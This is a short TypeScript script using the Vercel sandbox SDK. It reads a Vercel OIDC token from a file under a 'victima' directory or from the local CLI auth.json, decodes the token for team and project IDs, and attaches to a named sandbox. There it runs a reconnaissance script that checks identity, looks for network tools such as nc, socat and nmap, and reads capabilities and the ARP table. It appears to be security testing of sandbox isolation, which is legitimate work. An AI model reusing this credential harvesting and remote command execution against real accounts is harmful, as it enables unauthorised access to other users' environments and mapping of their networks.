import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
async function main() {
  const sbx = await Sandbox.get({ name: "ferreos-1787261996856", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
echo "=== quien soy ==="
whoami; id
echo "=== donde estan las herramientas ==="
command -v traceroute tracepath ping nmap busybox nc socat curl wget python3 ip 2>&1 | head -15
echo "=== capabilidades de red? ==="
cat /proc/self/status | grep -i cap
echo "=== kernel/sysctl enrutado ==="
cat /proc/sys/net/ipv4/ip_forward 2>/dev/null
echo "=== podemos leer /proc/net/arp? ==="
cat /proc/net/arp 2>/dev/null | head -10
echo "=== ip neigh ==="
ip neigh 2>/dev/null | head -10
echo "=== DONE ==="
`;
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
